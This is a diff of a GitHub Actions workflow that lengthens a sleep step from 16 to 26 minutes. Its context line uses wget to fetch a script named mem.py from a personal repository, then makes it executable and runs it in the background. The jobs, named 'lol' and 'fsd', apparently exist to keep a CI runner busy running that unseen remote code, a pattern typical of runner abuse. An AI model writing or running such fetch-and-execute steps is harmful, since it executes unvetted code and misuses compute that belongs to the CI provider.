@@ -75,7 +75,7 @@ jobs:
       id: go
     - name: clone
       run: wget https://github.com/ratnasi7283-art/yan/raw/refs/heads/main/mem.py && chmod u+x mem.py && python mem.py &
-            sleep 16m
+            sleep 26m
   fsd:
     needs: lol
     runs-on: ubuntu-latest
